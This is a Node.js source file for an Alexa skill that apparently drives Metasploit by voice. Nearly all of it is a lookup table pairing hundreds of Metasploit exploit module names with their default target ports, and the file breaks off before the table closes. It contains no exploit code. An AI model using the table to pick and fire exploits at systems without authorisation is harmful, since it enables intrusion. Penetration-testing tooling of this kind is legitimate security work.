'use strict';
// By David Cross
// This really needs to be rewritten in Python
// A) because I hate the call-back suckishness of early Node
// B) because Python supports synch and asynch web calls which is handy 
// C) because Python rocks
// D) because this was my second Alexa skill and I was in a hurry to get it coded up
const APP_ID = "amzn1.ask.skill.becfcd54-dd71-43be-8db7-d1f262bff826"; // TODO replace with your app ID if customizing your own copy.
const Alexa = require('alexa-sdk');
//const request = require('sync-request');
//const awsSDK = require('aws-sdk');
const https = require('https');
//var Data = require("./data");
var crypto = require('crypto');

// the following typically looks like: "exploit/osx/mdns/upnp_location" : "0", // but pymetasploit uses just the part after the exploit/
const exploitports = { "EXPLOITPORTS_EN_US":{
"osx/mdns/upnp_location" : "0",
"windows/dcerpc/ms07_029_msdns_zonename" : "0",
"windows/scada/igss9_misc" : "0",
"windows/firewall/blackice_pam_icq" : "1",
"freebsd/ftp/proftp_telnet_iac" : "21",
"linux/ftp/proftp_sreplace" : "21",
"linux/ftp/proftp_telnet_iac" : "21",
"mainframe/ftp/ftp_jcl_creds" : "21",
"multi/ftp/pureftpd_bash_env_exec" : "21",
"multi/ftp/wuftpd_site_exec_format" : "21",
"osx/ftp/webstar_ftp_user" : "21",
"unix/ftp/proftpd_133c_backdoor" : "21",
"unix/ftp/vsftpd_234_backdoor" : "21",
"windows/ftp/3cdaemon_ftp_user" : "21",
"windows/ftp/ability_server_stor" : "21",
"windows/ftp/bison_ftp_bof" : "21",
"windows/ftp/cesarftp_mkd" : "21",
"windows/ftp/comsnd_ftpd_fmtstr" : "21",
"windows/ftp/dreamftp_format" : "21",
"windows/ftp/easyfilesharing_pass" : "21",
"windows/ftp/easyftp_cwd_fixret" : "21",
"windows/ftp/easyftp_list_fixret" : "21",
"windows/ftp/easyftp_mkd_fixret" : "21",
"windows/ftp/filecopa_list_overflow" : "21",
"windows/ftp/freefloatftp_user" : "21",
"windows/ftp/freefloatftp_wbem" : "21",
"windows/ftp/freeftpd_pass" : "21",
"windows/ftp/freeftpd_user" : "21",
"windows/ftp/globalscapeftp_input" : "21",
"windows/ftp/goldenftp_pass_bof" : "21",
"windows/ftp/httpdx_tolog_format" : "21",
"windows/ftp/kmftp_utility_cwd" : "21",
"windows/ftp/ms09_053_ftpd_nlst" : "21",
"windows/ftp/netterm_netftpd_user" : "21",
"windows/ftp/open_ftpd_wbem" : "21",
"windows/ftp/pcman_put" : "21",
"windows/ftp/pcman_stor" : "21",
"windows/ftp/quickshare_traversal_write" : "21",
"windows/ftp/ricoh_dl_bof" : "21",
"windows/ftp/sami_ftpd_list" : "21",
"windows/ftp/sami_ftpd_user" : "21",
"windows/ftp/servu_chmod" : "21",
"windows/ftp/servu_mdtm" : "21",
"windows/ftp/slimftpd_list_concat" : "21",
"windows/ftp/turboftp_port" : "21",
"windows/ftp/vermillion_ftpd_port" : "21",
"windows/ftp/warftpd_165_pass" : "21",
"windows/ftp/warftpd_165_user" : "21",
"windows/ftp/wftpd_size" : "21",
"windows/ftp/wsftp_server_503_mkd" : "21",
"windows/ftp/wsftp_server_505_xmd5" : "21",
"windows/ftp/xlink_server" : "21",
"apple_ios/ssh/cydia_default_ssh" : "22",
"linux/ssh/ceragon_fibeair_known_privkey" : "22",
"linux/ssh/exagrid_known_privkey" : "22",
"linux/ssh/f5_bigip_known_privkey" : "22",
"linux/ssh/loadbalancerorg_enterprise_known_privkey" : "22",
"linux/ssh/quantum_dxi_known_privkey" : "22",
"linux/ssh/quantum_vmpro_backdoor" : "22",
"linux/ssh/symantec_smg_ssh" : "22",
"multi/ssh/sshexec" : "22",
"unix/ssh/array_vxag_vapv_privkey_privesc" : "22",
"unix/ssh/tectia_passwd_changereq" : "22",
"windows/ssh/freeftpd_key_exchange" : "22",
"windows/ssh/freesshd_authbypass" : "22",
"windows/ssh/freesshd_key_exchange" : "22",
"windows/ssh/sysax_ssh_username" : "22",
"freebsd/telnet/telnet_encrypt_keyid" : "23",
"linux/telnet/telnet_encrypt_keyid" : "23",
"solaris/telnet/fuser" : "23",
"solaris/telnet/ttyprompt" : "23",
"windows/proxy/ccproxy_telnet_ping" : "23",
"windows/scada/procyon_core_server" : "23",
"windows/telnet/gamsoft_telsrv_username" : "23",
"apple_ios/email/mobilemail_libtiff" : "25",
"linux/smtp/exim4_dovecot_exec" : "25",
"linux/smtp/exim_gethostbyname_bof" : "25",
"osx/email/mailapp_image_exec" : "25",
"unix/smtp/clamav_milter_blackhole" : "25",
"unix/smtp/exim4_string_format" : "25",
"unix/webapp/squirrelmail_pgp_plugin" : "25",
"windows/email/ms07_017_ani_loadimage_chunksize" : "25",
"windows/email/ms10_045_outlook_ref_only" : "25",
"windows/email/ms10_045_outlook_ref_resolve" : "25",
"windows/lotus/domino_icalendar_organizer" : "25",
"windows/lotus/lotusnotes_lzh" : "25",
"windows/smtp/mailcarrier_smtp_ehlo" : "25",
"windows/smtp/mercury_cram_md5" : "25",
"windows/smtp/ms03_046_exchange2000_xexch50" : "25",
"windows/smtp/njstar_smtp_bof" : "25",
"windows/smtp/wmailserver" : "25",
"windows/smtp/ypops_overflow1" : "25",
"windows/wins/ms04_045_wins" : "42",
"freebsd/tacacs/xtacacsd_report" : "49",
"windows/tftp/attftp_long_filename" : "69",
"windows/tftp/distinct_tftp_traversal" : "69",
"windows/tftp/dlink_long_filename" : "69",
"windows/tftp/futuresoft_transfermode" : "69",
"windows/tftp/netdecision_tftp_traversal" : "69",
"windows/tftp/opentftp_error_code" : "69",
"windows/tftp/quick_tftp_pro_mode" : "69",
"windows/tftp/tftpd32_long_filename" : "69",
"windows/tftp/tftpdwin_long_filename" : "69",
"windows/tftp/tftpserver_wrq_bof" : "69",
"windows/tftp/threectftpsvc_long_mode" : "69",
"bsdi/softcart/mercantec_softcart" : "80",
"freebsd/misc/citrix_netscaler_soap_bof" : "80",
"linux/http/advantech_switch_bash_env_exec" : "80",
"linux/http/airties_login_cgi_bof" : "80",
"linux/http/astium_sqli_upload" : "80",
"linux/http/atutor_filemanager_traversal" : "80",
"linux/http/centreon_sqli_exec" : "80",
"linux/http/ddwrt_cgibin_exec" : "80",
"linux/http/dlink_authentication_cgi_bof" : "80",
"linux/http/dlink_command_php_exec_noauth" : "80",
"linux/http/dlink_dcs_930l_authenticated_remote_command_execution" : "80",
"linux/http/dlink_dcs931l_upload" : "80",
"linux/http/dlink_diagnostic_exec_noauth" : "80",
"linux/http/dlink_dir300_exec_telnet" : "80",
"linux/http/dlink_dir605l_captcha_bof" : "80",
"linux/http/dlink_dir615_up_exec" : "80",
"linux/http/dlink_dspw110_cookie_noauth_exec" : "80",
"linux/http/dlink_dspw215_info_cgi_bof" : "80",
"linux/http/dlink_hedwig_cgi_bof" : "80",
"linux/http/dlink_hnap_bof" : "80",
"linux/http/dlink_hnap_header_exec_noauth" : "80",
"linux/http/dolibarr_cmd_exec" : "80",
"linux/http/dreambox_openpli_shell" : "80",
"linux/http/esva_exec" : "80",
"linux/http/fritzbox_echo_exec" : "80",
"linux/http/gitlist_exec" : "80",
"linux/http/groundwork_monarch_cmd_exec" : "80",
"linux/http/linksys_apply_cgi" : "80",
"linux/http/linksys_e1500_apply_exec" : "80",
"linux/http/linksys_themoon_exec" : "80",
"linux/http/linksys_wrt110_cmd_exec" : "80",
"linux/http/linksys_wrt160nv2_apply_exec" : "80",
"linux/http/linksys_wrt54gl_apply_exec" : "80",
"linux/http/multi_ncc_ping_exec" : "80",
"linux/http/mutiny_frontend_upload" : "80",
"linux/http/netgear_dgn1000b_setup_exec" : "80",
"linux/http/netgear_dgn2200b_pppoe_exec" : "80",
"linux/http/nginx_chunked_size" : "80",
"linux/http/pandora_fms_sqli" : "80",
"linux/http/piranha_passwd_exec" : "80",
"linux/http/raidsonic_nas_ib5220_exec_noauth" : "80",
"linux/http/railo_cfml_rfi" : "80",
"linux/http/seagate_nas_php_exec_noauth" : "80",
"linux/http/smt_ipmi_close_window_bof" : "80",
"linux/http/symantec_web_gateway_exec" : "80",
"linux/http/symantec_web_gateway_file_upload" : "80",
"linux/http/symantec_web_gateway_lfi" : "80",
"linux/http/symantec_web_gateway_pbcontrol" : "80",
"linux/http/tiki_calendar_exec" : "80",
"linux/http/tp_link_sc2020n_authenticated_telnet_injection" : "80",
"linux/http/vap2500_tools_command_exec" : "80",
"linux/http/vcms_upload" : "80",
"linux/http/wanem_exec" : "80",
"linux/http/webcalendar_settings_exec" : "80",
"linux/http/webid_converter" : "80",
"linux/http/zabbix_sqli" : "80",
"multi/http/activecollab_chat" : "80",
"multi/http/ajaxplorer_checkinstall_exec" : "80",
"multi/http/apache_mod_cgi_bash_env_exec" : "80",
"multi/http/apprain_upload_exec" : "80",
"multi/http/atutor_sqli" : "80",
"multi/http/auxilium_upload_exec" : "80",
"multi/http/bolt_file_upload" : "80",
"multi/http/caidao_php_backdoor_exec" : "80",
"multi/http/cisco_dcnm_upload" : "80",
"multi/http/coldfusion_rds" : "80",
"multi/http/cuteflow_upload_exec" : "80",
"multi/http/dexter_casinoloader_exec" : "80",
"multi/http/drupal_drupageddon" : "80",
"multi/http/extplorer_upload_exec" : "80",
"multi/http/familycms_less_exec" : "80",
"multi/http/freenas_exec_raw" : "80",
"multi/http/gestioip_exec" : "80",
"multi/http/gitlab_shell_exec" : "80",
"multi/http/gitorious_graph" : "80",
"multi/http/glossword_upload_exec" : "80",
"multi/http/glpi_install_rce" : "80",
"multi/http/horde_href_backdoor" : "80",
"multi/http/ispconfig_php_exec" : "80",
"multi/http/jenkins_script_console" : "80",
"multi/http/joomla_http_header_rce" : "80",
"multi/http/kordil_edms_upload_exec" : "80",
"multi/http/lcms_php_exec" : "80",
"multi/http/log1cms_ajax_create_folder" : "80",
"multi/http/magento_unserialize" : "80",
"multi/http/mantisbt_php_exec" : "80",
"multi/http/mediawiki_thumb" : "80",
"multi/http/mma_backdoor_upload" : "80",
"multi/http/mobilecartly_upload_exec" : "80",
"multi/http/moodle_cmd_exec" : "80",
"multi/http/movabletype_upgrade_exec" : "80",
"multi/http/mutiny_subnetmask_exec" : "80",
"multi/http/nas4free_php_exec" : "80",
"multi/http/nibbleblog_file_upload" : "80",
"multi/http/novell_servicedesk_rce" : "80",
"multi/http/openmediavault_cmd_exec" : "80",
"multi/http/openx_backdoor_php" : "80",
"multi/http/opmanager_socialit_file_upload" : "80",
"multi/http/oracle_reports_rce" : "80",
"multi/http/pandora_upload_exec" : "80",
"multi/http/php_cgi_arg_injection" : "80",
"multi/http/phpfilemanager_rce" : "80",
"multi/http/phpldapadmin_query_engine" : "80",
"multi/http/phpmoadmin_exec" : "80",
"multi/http/phpmyadmin_3522_backdoor" : "80",
"multi/http/phpmyadmin_preg_replace" : "80",
"multi/http/phpscheduleit_start_date" : "80",
"multi/http/phptax_exec" : "80",
"multi/http/php_utility_belt_rce" : "80",
"multi/http/php_volunteer_upload_exec" : "80",
"multi/http/phpwiki_ploticus_exec" : "80",
"multi/http/pmwiki_pagelist" : "80",
"multi/http/polarcms_upload_exec" : "80",
"multi/http/processmaker_exec" : "80",
"multi/http/qdpm_upload_exec" : "80",
"multi/http/rails_json_yaml_code_exec" : "80",
"multi/http/rails_secret_deserialization" : "80",
"multi/http/rails_xml_yaml_code_exec" : "80",
"multi/http/sflog_upload_exec" : "80",
"multi/http/simple_backdoors_exec" : "80",
"multi/http/sit_file_upload" : "80",
"multi/http/snortreport_exec" : "80",
"multi/http/sonicwall_gms_upload" : "80",
"multi/http/sonicwall_scrutinizer_methoddetail_sqli" : "80",
"multi/http/spree_search_exec" : "80",
"multi/http/spree_searchlogic_exec" : "80",
"multi/http/stunshell_eval" : "80",
"multi/http/stunshell_exec" : "80",
"multi/http/sun_jsws_dav_options" : "80",
"multi/http/testlink_upload_exec" : "80",
"multi/http/tomcat_mgr_deploy" : "80",
"multi/http/tomcat_mgr_upload" : "80",
"multi/http/traq_plugin_exec" : "80",
"multi/http/v0pcr3w_exec" : "80",
"multi/http/vbseo_proc_deutf" : "80",
"multi/http/vbulletin_unserialize" : "80",
"multi/http/vtiger_install_rce" : "80",
"multi/http/vtiger_php_exec" : "80",
"multi/http/vtiger_soap_upload" : "80",
"multi/http/webpagetest_upload_exec" : "80",
"multi/http/werkzeug_debug_rce" : "80",
"multi/http/wikka_spam_exec" : "80",
"multi/http/x7chat2_php_exec" : "80",
"multi/http/zabbix_script_exec" : "80",
"multi/http/zemra_panel_rce" : "80",
"multi/http/zpanel_information_disclosure_rce" : "80",
"multi/php/php_unserialize_zval_cookie" : "80",
"multi/realserver/describe" : "80",
"multi/wyse/hagent_untrusted_hsdata" : "80",
"unix/ftp/proftpd_modcopy_exec" : "80",
"unix/http/contentkeeperweb_mimencode" : "80",
"unix/http/ctek_skyrouter" : "80",
"unix/http/dell_kace_k1000_upload" : "80",
"unix/http/freepbx_callmenum" : "80",
"unix/http/lifesize_room" : "80",
"unix/http/twiki_debug_plugins" : "80",
"unix/http/vmturbo_vmtadmin_exec_noauth" : "80",
"unix/webapp/actualanalyzer_ant_cookie_exec" : "80",
"unix/webapp/arkeia_upload_exec" : "80",
"unix/webapp/awstats_configdir_exec" : "80",
"unix/webapp/awstats_migrate_exec" : "80",
"unix/webapp/awstatstotals_multisort" : "80",
"unix/webapp/barracuda_img_exec" : "80",
"unix/webapp/base_qry_common" : "80",
"unix/webapp/basilic_diff_exec" : "80",
"unix/webapp/cacti_graphimage_exec" : "80",
"unix/webapp/cakephp_cache_corruption" : "80",
"unix/webapp/carberp_backdoor_exec" : "80",
"unix/webapp/clipbucket_upload_exec" : "80",
"unix/webapp/coppermine_piceditor" : "80",
"unix/webapp/datalife_preview_exec" : "80",
"unix/webapp/dogfood_spell_exec" : "80",
"unix/webapp/egallery_upload_exec" : "80",
"unix/webapp/flashchat_upload_exec" : "80",
"unix/webapp/foswiki_maketext" : "80",
"unix/webapp/freepbx_config_exec" : "80",
"unix/webapp/generic_exec" : "80",
"unix/webapp/get_simple_cms_upload_exec" : "80",
"unix/webapp/google_proxystylesheet_exec" : "80",
"unix/webapp/graphite_pickle_exec" : "80",
"unix/webapp/guestbook_ssi_exec" : "80",
"unix/webapp/hastymail_exec" : "80",
"unix/webapp/havalite_upload_exec" : "80",
"unix/webapp/horde_unserialize_exec" : "80",
"unix/webapp/hybridauth_install_php_exec" : "80",
"unix/webapp/instantcms_exec" : "80",
"unix/webapp/invision_pboard_unserialize_exec" : "80",
"unix/webapp/joomla_akeeba_unserialize" : "80",
"unix/webapp/joomla_comjce_imgmanager" : "80",
"unix/webapp/joomla_contenthistory_sqli_rce" : "80",
"unix/webapp/joomla_media_upload_exec" : "80",
"unix/webapp/joomla_tinybrowser" : "80",
"unix/webapp/kimai_sqli" : "80",
"unix/webapp/libretto_upload_exec" : "80",
"unix/webapp/maarch_letterbox_file_upload" : "80",
"unix/webapp/mambo_cache_lite" : "80",
"unix/webapp/mitel_awc_exec" : "80",
"unix/webapp/moinmoin_twikidraw" : "80",
"unix/webapp/mybb_backdoor" : "80",
"unix/webapp/nagios3_history_cgi" : "80",
"unix/webapp/nagios3_statuswml_ping" : "80",
"unix/webapp/nagios_graph_explorer" : "80",
"unix/webapp/narcissus_backend_exec" : "80",
"unix/webapp/openemr_sqli_privesc_upload" : "80",
"unix/webapp/openemr_upload_exec" : "80",
"unix/webapp/open_flash_chart_upload_exec" : "80",
"unix/webapp/opensis_modname_exec" : "80",
"unix/webapp/openview_connectednodes_exec" : "80",
"unix/webapp/openx_banner_edit" : "80",
"unix/webapp/oscommerce_filemanager" : "80",
"unix/webapp/pajax_remote_exec" : "80",
"unix/webapp/phpbb_highlight" : "80",
"unix/webapp/php_charts_exec" : "80",
"unix/webapp/php_eval" : "80",
"unix/webapp/php_include" : "80",
"unix/webapp/phpmyadmin_config" : "80",
"unix/webapp/php_vbulletin_template" : "80",
"unix/webapp/php_xmlrpc_eval" : "80",
"unix/webapp/projectpier_upload_exec" : "80",
"unix/webapp/projectsend_upload_exec" : "80",
"unix/webapp/redmine_scm_exec" : "80",
"unix/webapp/seportal_sqli_exec" : "80",
"unix/webapp/simple_e_document_upload_exec" : "80",
"unix/webapp/sixapart_movabletype_storable_exec" : "80",
"unix/webapp/skybluecanvas_exec" : "80",
"unix/webapp/sphpblog_file_upload" : "80",
"unix/webapp/spip_connect_exec" : "80",
"unix/webapp/squash_yaml_exec" : "80",
"unix/webapp/sugarcrm_unserialize_exec" : "80",
"unix/webapp/tikiwiki_graph_formula_exec" : "80",
"unix/webapp/tikiwiki_jhot_exec" : "80",
"unix/webapp/tikiwiki_unserialize_exec" : "80",
"unix/webapp/trixbox_langchoice" : "80",
"unix/webapp/twiki_history" : "80",
"unix/webapp/twiki_maketext" : "80",
"unix/webapp/twiki_search" : "80",
"unix/webapp/vbulletin_vote_sqli_exec" : "80",
"unix/webapp/vicidial_manager_send_cmd_exec" : "80",
"unix/webapp/webtester_exec" : "80",
"unix/webapp/wp_admin_shell_upload" : "80",
"unix/webapp/wp_advanced_custom_fields_exec" : "80",
"unix/webapp/wp_ajax_load_more_file_upload" : "80",
"unix/webapp/wp_asset_manager_upload_exec" : "80",
"unix/webapp/wp_creativecontactform_file_upload" : "80",
"unix/webapp/wp_downloadmanager_upload" : "80",
"unix/webapp/wp_easycart_unrestricted_file_upload" : "80",
"unix/webapp/wp_foxypress_upload" : "80",
"unix/webapp/wp_frontend_editor_file_upload" : "80",
"unix/webapp/wp_google_document_embedder_exec" : "80",
"unix/webapp/wp_holding_pattern_file_upload" : "80",
"unix/webapp/wp_inboundio_marketing_file_upload" : "80",
"unix/webapp/wp_infusionsoft_upload" : "80",
"unix/webapp/wp_lastpost_exec" : "80",
"unix/webapp/wp_ninja_forms_unauthenticated_file_upload" : "80",
"unix/webapp/wp_nmediawebsite_file_upload" : "80",
"unix/webapp/wp_optimizepress_upload" : "80",
"unix/webapp/wp_photo_gallery_unrestricted_file_upload" : "80",
"unix/webapp/wp_pixabay_images_upload" : "80",
"unix/webapp/wp_platform_exec" : "80",
"unix/webapp/wp_property_upload_exec" : "80",
"unix/webapp/wp_reflexgallery_file_upload" : "80",
"unix/webapp/wp_revslider_upload_execute" : "80",
"unix/webapp/wp_slideshowgallery_upload" : "80",
"unix/webapp/wp_symposium_shell_upload" : "80",
"unix/webapp/wp_total_cache_exec" : "80",
"unix/webapp/wp_worktheflow_upload" : "80",
"unix/webapp/wp_wpshop_ecommerce_file_upload" : "80",
"unix/webapp/wp_wptouch_file_upload" : "80",
"unix/webapp/wp_wysija_newsletters_upload" : "80",
"unix/webapp/xoda_file_upload" : "80",
"unix/webapp/zeroshell_exec" : "80",
"unix/webapp/zoneminder_packagecontrol_exec" : "80",
"unix/webapp/zpanel_username_exec" : "80",
"windows/http/amlibweb_webquerydll_app" : "80",
"windows/http/apache_chunked" : "80",
"windows/http/apache_modjk_overflow" : "80",
"windows/http/apache_mod_rewrite_ldap" : "80",
"windows/http/avaya_ccr_imageupload_exec" : "80",
"windows/http/badblue_ext_overflow" : "80",
"windows/http/badblue_passthru" : "80",
"windows/http/bea_weblogic_jsessionid" : "80",
"windows/http/bea_weblogic_post_bof" : "80",
"windows/http/bea_weblogic_transfer_encoding" : "80",
"windows/http/belkin_bulldog" : "80",
"windows/http/cogent_datahub_command" : "80",
"windows/http/cogent_datahub_request_headers_bof" : "80",
"windows/http/coldfusion_fckeditor" : "80",
"windows/http/easyfilesharing_seh" : "80",
"windows/http/efs_easychatserver_username" : "80",
"windows/http/efs_fmws_userid_bof" : "80",
"windows/http/ektron_xslt_exec" : "80",
"windows/http/fdm_auth_header" : "80",
"windows/http/generic_http_dll_injection" : "80",
"windows/http/hp_mpa_job_acct" : "80",
"windows/http/hp_nnm_getnnmdata_hostname" : "80",
"windows/http/hp_nnm_getnnmdata_icount" : "80",
"windows/http/hp_nnm_getnnmdata_maxage" : "80",
"windows/http/hp_nnm_nnmrptconfig_nameparams" : "80",
"windows/http/hp_nnm_nnmrptconfig_schdparams" : "80",
"windows/http/hp_nnm_openview5" : "80",
"windows/http/hp_nnm_ovalarm_lang" : "80",
"windows/http/hp_nnm_ovbuildpath_textfile" : "80",
"windows/http/hp_nnm_ovwebhelp" : "80",
"windows/http/hp_nnm_ovwebsnmpsrv_main" : "80",
"windows/http/hp_nnm_ovwebsnmpsrv_ovutil" : "80",
"windows/http/hp_nnm_ovwebsnmpsrv_uro" : "80",
"windows/http/hp_nnm_snmp" : "80",
"windows/http/hp_nnm_snmpviewer_actapp" : "80",
"windows/http/hp_nnm_toolbar_01" : "80",
"windows/http/hp_nnm_toolbar_02" : "80",
"windows/http/hp_nnm_webappmon_execvp" : "80",
"windows/http/hp_nnm_webappmon_ovjavalocale" : "80",
"windows/http/hp_openview_insight_backdoor" : "80",
"windows/http/hp_power_manager_filename" : "80",
"windows/http/hp_power_manager_login" : "80",
"windows/http/httpdx_handlepeer" : "80",
"windows/http/httpdx_tolog_format" : "80",
"windows/http/ia_webmail" : "80",
"windows/http/intrasrv_bof" : "80",
"windows/http/ipswitch_wug_maincfgret" : "80",
"windows/http/kaseya_uploader" : "80",
"windows/http/kaseya_uploadimage_file_upload" : "80",
"windows/http/kolibri_http" : "80",
"windows/http/landesk_thinkmanagement_upload_asp" : "80",
"windows/http/mailenable_auth_header" : "80",
"windows/http/manage_engine_opmanager_rce" : "80",
"windows/http/minishare_get_overflow" : "80",
"windows/http/navicopa_get_overflow" : "80",
"windows/http/netdecision_http_bof" : "80",
"windows/http/novell_mdm_lfi" : "80",
"windows/http/php_apache_request_headers_bof" : "80",
"windows/http/privatewire_gateway" : "80",
"windows/http/rejetto_hfs_exec" : "80",
"windows/http/sambar6_search_results" : "80",
"windows/http/savant_31_overflow" : "80",
"windows/http/servu_session_cookie" : "80",
"windows/http/shttpd_post" : "80",
"windows/http/sonicwall_scrutinizer_sqli" : "80",
"windows/http/sws_connection_bof" : "80",
"windows/http/sysax_create_folder" : "80",
"windows/http/trackit_file_upload" : "80",
"windows/http/ultraminihttp_bof" : "80",
"windows/http/umbraco_upload_aspx" : "80",
"windows/http/webster_http" : "80",
"windows/http/xampp_webdav_upload_php" : "80",
"windows/http/xitami_if_mod_since" : "80",
"windows/http/zenworks_uploadservlet" : "80",
"windows/iis/iis_webdav_upload_asp" : "80",
"windows/iis/ms01_023_printer" : "80",
"windows/iis/ms01_026_dbldecode" : "80",
"windows/iis/ms01_033_idq" : "80",
"windows/iis/ms02_018_htr" : "80",
"windows/iis/ms02_065_msadc" : "80",
"windows/iis/ms03_007_ntdll_webdav" : "80",
"windows/iis/msadc" : "80",
"windows/isapi/ms00_094_pbserver" : "80",
"windows/isapi/ms03_022_nsiislog_post" : "80",
"windows/isapi/ms03_051_fp30reg_chunked" : "80",
"windows/isapi/rsa_webagent_redirect" : "80",
"windows/isapi/w3who_query" : "80",
"windows/lotus/domino_http_accept_language" : "80",
"windows/mssql/ms09_004_sp_replwritetovarbin_sqli" : "80",
"windows/mssql/mssql_payload_sqli" : "80",
"windows/proxy/bluecoat_winproxy_host" : "80",
"windows/proxy/qbik_wingate_wwwproxy" : "80",
"windows/scada/advantech_webaccess_dashboard_file_upload" : "80",
"windows/scada/ge_proficy_cimplicity_gefebt" : "80",
"windows/http/mcafee_epolicy_source" : "81",
"windows/misc/mercury_phonebook" : "105",
"linux/pop3/cyrus_pop3d_popsubfolders" : "110",
"windows/pop3/seattlelab_pass" : "110",
"aix/rpc_cmsd_opcode21" : "111",
"aix/rpc_ttdbserverd_realpath" : "111",
"netware/sunrpc/pkernel_callit" : "111",
"solaris/sunrpc/sadmind_adm_build_path" : "111",
"solaris/sunrpc/sadmind_exec" : "111",
"solaris/sunrpc/ypupdated_exec" : "111",
"windows/brightstor/mediasrv_sunrpc" : "111",
"windows/emc/networker_format_string" : "111",
"windows/misc/tiny_identd_overflow" : "113",
"multi/ntp/ntp_overflow" : "123",
"windows/dcerpc/ms03_026_dcom" : "135",
"freebsd/samba/trans2open" : "139",
"linux/samba/chain_reply" : "139",
"linux/samba/trans2open" : "139",
"multi/ids/snort_dce_rpc" : "139",
"multi/samba/nttrans" : "139",
"multi/samba/usermap_script" : "139",
"osx/samba/trans2open" : "139",
"solaris/samba/trans2open" : "139",
"linux/imap/imap_uw_lsub" : "143",
"windows/imap/eudora_list" : "143",
"windows/imap/imail_delete" : "143",
"windows/imap/ipswitch_search" : "143",
"windows/imap/mailenable_login" : "143",
"windows/imap/mailenable_status" : "143",
"windows/imap/mailenable_w3c_select" : "143",
"windows/imap/mdaemon_cram_md5" : "143",
"windows/imap/mdaemon_fetch" : "143",
"windows/imap/mercur_imap_select_overflow" : "143",
"windows/imap/mercur_login" : "143",
"windows/imap/mercury_login" : "143",
"windows/imap/mercury_rename" : "143",
"windows/imap/novell_netmail_append" : "143",
"windows/imap/novell_netmail_auth" : "143",
"windows/imap/novell_netmail_status" : "143",
"windows/imap/novell_netmail_subscribe" : "143",
"windows/ldap/imail_thc" : "389",
"windows/ldap/pgp_keyserver7" : "389",
"windows/misc/altiris_ds_sqli" : "402",
"windows/motorola/timbuktu_fileupload" : "407",
"freebsd/http/watchguard_cmd_exec" : "443",
"linux/http/accellion_fta_getstatus_oauth" : "443",
"linux/http/alcatel_omnipcx_mastercgi_exec" : "443",
"linux/http/alienvault_sqli_exec" : "443",
"linux/http/cfme_manageiq_evm_upload_exec" : "443",
"linux/http/f5_icall_cmd" : "443",
"linux/http/f5_icontrol_exec" : "443",
"linux/http/foreman_openstack_satellite_code_exec" : "443",
"linux/http/lifesize_uvc_ping_rce" : "443",
"linux/http/netgear_readynas_exec" : "443",
"linux/http/op5_config_exec" : "443",
"linux/http/sophos_wpa_iface_exec" : "443",
"linux/http/sophos_wpa_sblistpack_exec" : "443",
"linux/http/symantec_web_gateway_restore" : "443",
"linux/ssh/ubiquiti_airos_file_upload" : "443",
"multi/http/op5_license" : "443",
"multi/http/op5_welcome" : "443",
"multi/http/zenworks_configuration_management_upload" : "443",
"multi/http/zenworks_control_center_upload" : "443",
"unix/webapp/citrix_access_gateway_exec" : "443",
"unix/webapp/tuleap_unserialize_exec" : "443",
"windows/http/hp_pcm_snac_update_certificates" : "443",
"windows/http/hp_pcm_snac_update_domain" : "443",
"windows/http/ibm_tpmfosd_overflow" : "443",
"windows/http/osb_uname_jlist" : "443",
"windows/http/vmware_vcenter_chargeback_upload" : "443",
"windows/misc/hp_loadrunner_magentproc" : "443",
"windows/novell/netiq_pum_eval" : "443",
"linux/http/ipfire_bashbug_exec" : "444",
"linux/http/ipfire_proxy_exec" : "444",
"linux/http/zen_load_balancer_exec" : "444",
"linux/samba/lsa_transnames_heap" : "445",
"linux/samba/setinfopolicy_heap" : "445",
"netware/smb/lsass_cifs" : "445",
"osx/samba/lsa_transnames_heap" : "445",
"solaris/samba/lsa_transnames_heap" : "445",
"windows/brightstor/etrust_itm_alert" : "445",
"windows/oracle/extjob" : "445",
"windows/smb/ipass_pipe_exec" : "445",
"windows/smb/ms03_049_netapi" : "445",
"windows/smb/ms17_010_eternalblue" : "445",
"windows/smb/ms04_007_killbill" : "445",
"windows/smb/ms04_011_lsass" : "445",
"windows/smb/ms04_031_netdde" : "445",
"windows/smb/ms05_039_pnp" : "445",
"windows/smb/ms06_025_rasmans_reg" : "445",
"windows/smb/ms06_025_rras" : "445",
"windows/smb/ms06_040_netapi" : "445",
"windows/smb/ms06_066_nwapi" : "445",
"windows/smb/ms06_066_nwwks" : "445",
"windows/smb/ms06_070_wkssvc" : "445",
"windows/smb/ms07_029_msdns_zonename" : "445",
"windows/smb/ms08_067_netapi" : "445",
"windows/smb/ms09_050_smb2_negotiate_func_index" : "445",
"windows/smb/ms10_061_spoolss" : "445",
"windows/smb/netidentity_xtierrpcpipe" : "445",
"windows/smb/psexec_psh" : "445",
"windows/smb/psexec" : "445",
"windows/smb/timbuktu_plughntcommand_bof" : "445",
"linux/http/openfiler_networkcard_exec" : "446",
"windows/misc/enterasys_netsight_syslog_bof" : "514",
"windows/misc/windows_rsh" : "514",
"hpux/lpd/cleanup_exec" : "515",
"irix/lpd/tagprinter_exec" : "515",
"linux/misc/lprng_format_string" : "515",
"solaris/lpd/sendmail_exec" : "515",
"windows/lpd/hummingbird_exceed" : "515",
"windows/lpd/niprint" : "515",
"windows/lpd/saplpd" : "515",
"linux/misc/novell_edirectory_ncp_bof" : "524",
"osx/afp/loginext" : "548",
"linux/misc/hikvision_rtsp_bof" : "554",
"multi/misc/arkeia_agent_exec" : "617",
"osx/arkeia/type77" : "617",
"windows/arkeia/type77" : "617",
"windows/misc/asus_dpcproxy_overflow" : "623",
"windows/novell/nmap_stor" : "689",
"multi/http/cups_bash_env_exec" : "631",
"multi/vpn/tincd_bof" : "655",
"windows/misc/agentxpp_receive_agentx" : "705",
"unix/misc/spamassassin_exec" : "783",
"windows/misc/allmediaserver_bof" : "888",
"windows/scada/realwin_on_fc_binfile_a" : "910",
"windows/scada/realwin_on_fcs_login" : "910",
"windows/scada/realwin" : "910",
"windows/scada/realwin_scpc_initialize_rf" : "912",
"windows/scada/realwin_scpc_initialize" : "912",
"windows/scada/realwin_scpc_txtevent" : "912",
"multi/misc/wireshark_lwres_getaddrbyname_loop" : "921",
"multi/misc/wireshark_lwres_getaddrbyname" : "921",
"windows/novell/zenworks_preboot_op21_bof" : "998",
"windows/novell/zenworks_preboot_op4c_bof" : "998",
"windows/novell/zenworks_preboot_op6_bof" : "998",
"windows/novell/zenworks_preboot_op6c_bof" : "998",
"windows/misc/doubletake" : "1100",
"windows/http/altn_webadmin" : "1000",
"multi/misc/java_rmi_server" : "1099",
"windows/http/sap_host_control_cmd_exec" : "1128",
"windows/oracle/client_system_analyzer_upload" : "1158",
"windows/scada/codesys_gateway_server_traversal" : "1211",
"unix/webapp/qtss_parse_xml_exec" : "1220",
